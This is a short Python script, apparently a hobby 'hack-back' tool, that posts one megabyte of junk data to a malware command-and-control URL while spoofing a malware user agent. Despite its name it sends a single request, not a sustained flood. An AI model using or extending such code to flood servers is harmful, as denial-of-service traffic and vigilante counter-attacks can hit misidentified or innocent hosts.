"""c2_ddoser.py - Python script to flood a C2 server with junk data"""

import requests

def c2_ddos(c2_url):
    """Floods a C2 server with junk data."""
    payload = {"data": "A" * 1000000}  # 1MB of junk
    headers = {"User-Agent": "EvilSpyware/1.0"}  # Mimic malware

    try:
        r = requests.post(c2_url, json=payload, headers=headers, timeout=5)
        print(f"Sent spicy payload: {r.status_code}")
    except Exception as e:
        print(f"Oops, C2 didn’t like our spice: {e}")

if __name__ == "__main__":
    c2_url = "http://192.168.1.100:8080/upload"  # Replace with target C2 URL
    c2_ddos(c2_url)